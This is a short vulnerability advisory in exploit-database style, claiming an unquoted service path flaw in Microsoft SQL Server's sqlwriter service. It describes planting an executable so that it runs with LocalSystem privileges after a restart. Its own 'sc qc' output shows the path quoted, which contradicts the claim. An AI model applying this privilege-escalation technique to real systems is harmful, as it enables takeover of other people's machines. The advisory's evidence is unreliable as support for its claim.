# Exploit Title: Microsoft SQL Server Unquoted Service Path Privilege Escalation
# Date: 10/142016
# Author: Saeed Hasanzadeh (Net.Hun73r)
# Vendor Homepage: https://www.microsoft.com
# Software Link: https://www.microsoft.com/en-us/download/details.aspx?id=29062
#version : 2012
# Tested on: Windows 7
##########################################################################

Microsoft SQL Server installs a service with an unquoted service path
To properly exploit this vulnerability,
the local attacker must insert an executable file in the path of the service.
Upon service restart or system reboot, the malicious code will be run
with elevated privileges.
-------------------------------------------
C:\>sc qc sqlwriter
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: sqlwriter
TYPE : 10 WIN32_OWN_PROCESS
START_TYPE : 2 AUTO_START
ERROR_CONTROL : 1 NORMAL
BINARY_PATH_NAME : "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
LOAD_ORDER_GROUP :
TAG : 0
DISPLAY_NAME : SQL Server VSS Writer
DEPENDENCIES :
SERVICE_START_NAME : LocalSystem

